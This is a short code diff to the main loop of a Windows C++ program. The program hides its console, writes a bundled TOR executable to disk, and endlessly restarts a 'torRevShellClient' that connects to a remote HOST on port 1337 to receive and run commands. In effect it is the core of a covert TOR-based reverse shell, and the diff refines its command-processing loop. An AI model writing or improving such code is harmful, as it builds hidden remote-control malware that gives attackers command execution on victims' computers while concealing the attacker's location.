@@ -35,7 +35,6 @@ void writeResToDisk(std::string path, int r, int t){
 int main() {
     ShowWindow(GetConsoleWindow(), (showConsole) ? SW_SHOW : SW_HIDE);
 
-
     // Put TOR onto the disk if it isnt there already
     if (GetFileAttributes((LPCWSTR)torExePath) == INVALID_FILE_ATTRIBUTES){
         writeResToDisk(torExePath, TOREXE, EXEFILE);
@@ -47,11 +46,12 @@ int main() {
     
     // Hell loop of forever restarting TOR and trying to connect to the server :)
     // I could make it not restart TOR every time, but I had a few problems with that before
+    // A timeout could be useful, since sometimes tor needs restarting a couple times to get a successfull connection quickly
     while (1) {
         torRevShellClient c(fullTorExePath, HOST, 1337);
         c.startProxy();
         c.attemptConnect();
-        c.cmdProcessLoop(); // If attemptConnect() fails, this function will return immediately
+        while (c.cmdProcess()); // cmdProcess() returns false if cant connect to server
     }
 
     return 0;
